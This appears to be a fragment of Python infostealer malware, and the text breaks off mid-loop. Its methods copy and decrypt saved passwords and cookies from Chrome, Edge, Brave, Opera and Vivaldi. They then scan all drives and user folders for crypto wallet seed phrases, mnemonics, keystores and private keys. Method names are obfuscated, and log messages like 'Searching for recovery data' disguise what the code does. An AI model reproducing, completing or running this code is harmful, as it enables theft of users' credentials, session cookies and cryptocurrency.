...
class _DP:
    ...
    def _gbp(self):
        ...
        br={'chrome':[os.path.join(b,r'Google\Chrome\User Data'),os.path.join(a,r'Google\Chrome\User Data')],'edge':[os.path.join(b,r'Microsoft\Edge\User Data')],'brave':[os.path.join(b,r'BraveSoftware\Brave-Browser\User Data')],'opera':[os.path.join(b,r'Opera Software\Opera Stable')],'vivaldi':[os.path.join(b,r'Vivaldi\User Data')]}
    ...
    def _gbpwd(self,bp,bn):
        ...
        try:
            ...
            k=self._gck(ls)
            td=os.path.join(self._od,f'{bn}_login.db')
            try:
                shutil.copy2(ld,td)
            except:
                return pwds
            ...
            for url,user,epwd in cur.fetchall():
                if epwd:
                    pwd=self._dv(epwd,k)
                    if pwd:
                        pwds.append({"url":url,"username":user,"password":pwd})
            conn.close()
            try:
                os.remove(td)
            except:pass
    ...
    def _gbc(self,bp,bn):
        ...
        try:
            ...
            k=self._gck(ls)
            td=os.path.join(self._od,f'{bn}_cookies.db')
            try:
                shutil.copy2(cd,td)
            except:
                return cks
            conn=sqlite3.connect(td)
            cur=conn.cursor()
            cur.execute("SELECT host_key,name,value,encrypted_value FROM cookies LIMIT 5000")
            for h,n,v,ev in cur.fetchall():
                cv=self._dv(ev,k) if ev else v
                if cv:
                    cks.append({"host":h,"name":n,"value":cv})
            conn.close()
            try:
                os.remove(td)
            except:pass
        ...
        return cks
    def _srf(self):
        self._lg("Searching for recovery data...")
        seeds=[]
        drives=[]
        try:
            r=subprocess.run(['wmic','logicaldisk','get','name'],capture_output=True,text=True)
            drives=[line.strip()+'\\' for line in r.stdout.split('\n') if line.strip() and ':' in line]
        except:
            drives=['C:\\']
        up=[os.environ.get('APPDATA',''),os.environ.get('LOCALAPPDATA',''),os.path.join(os.environ.get('USERPROFILE',''),'Documents'),os.path.join(os.environ.get('USERPROFILE',''),'Desktop'),os.path.join(os.environ.get('USERPROFILE',''),'Downloads')]
        sp=drives+up
        wd=['MetaMask','Trust Wallet','Exodus','Atomic Wallet','Electrum','MyEtherWallet','Phantom','Solflare','Coinbase','Binance']
        pat=['seed','mnemonic','wallet','backup','recovery','private','key','phrase','keystore','passphrase']
        ext=['.txt','.json','.dat','.key','.wallet','.keystore','.db','.sqlite','.ldb']
        self._ns._sm("Scanning system for data...")
        for bp in sp:
            if not os.path.exists(bp):continue
            ir=len(bp)==3 and bp.endswith(':\\')
            try:
                for root,dirs,files in os.walk(bp):
                    if not ir:
                        dirs[:]=[d for d in dirs if d not in ['$Recycle.Bin','System Volume Information','Windows','Program Files','Program Files (x86)']]
                    if ir:
                        depth=root[len(bp):].count(os.sep) if bp else 0
                        if depth>3:
                            dirs[:]=[]
                            continue
                    for file in files:
